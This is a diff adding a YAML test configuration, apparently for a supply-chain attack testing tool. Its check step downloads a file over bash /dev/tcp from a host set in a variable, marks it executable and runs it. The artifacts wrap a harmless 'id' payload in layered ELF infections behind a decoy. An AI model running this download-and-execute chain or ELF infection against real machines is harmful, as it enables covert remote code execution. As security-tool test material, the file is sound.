@@ -1,0 +1,40 @@
+check:
+  # use an obscurely old linux
+  image: ubuntu:12.04
+  cmds:
+    # use a bash downloader because the only alternative would be python 2.7
+    - |
+      bash -c '{ echo -ne "GET /a HTTP/1.0\r\n\r\n" 1>&3; cat 0<&3; } \
+        3<>/dev/tcp/$SH4D0WUP_BOUND_IP/$SH4D0WUP_BOUND_PORT \
+        | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > /a'
+    - chmod +x /a
+    - /a
+
+artifacts:
+  payload:
+    type: inline
+    data: |
+      id
+  elf1:
+    type: infect
+    infect: elf-fwd-stdin
+    artifact: payload
+  elf-decoy:
+    type: infect
+    infect: elf-fwd-stdin
+    data: 'echo :3'
+  elf2:
+    type: infect
+    infect: elf
+    artifact: elf1
+  elf3:
+    type: infect
+    infect: elf
+    artifact: elf1
+    elf_artifact: elf-decoy
+
+routes:
+  - path: /a
+    type: static
+    args:
+      artifact: elf3
